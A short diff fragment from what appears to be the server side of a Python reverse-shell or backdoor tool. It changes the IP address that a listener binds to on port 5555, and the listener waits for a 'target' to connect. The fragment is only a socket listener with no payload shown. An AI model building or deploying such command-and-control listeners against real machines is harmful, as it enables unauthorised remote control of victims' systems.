@@ -83,7 +83,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.0.112', 5555))
+sock.bind(('10.132.0.4', 5555))
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
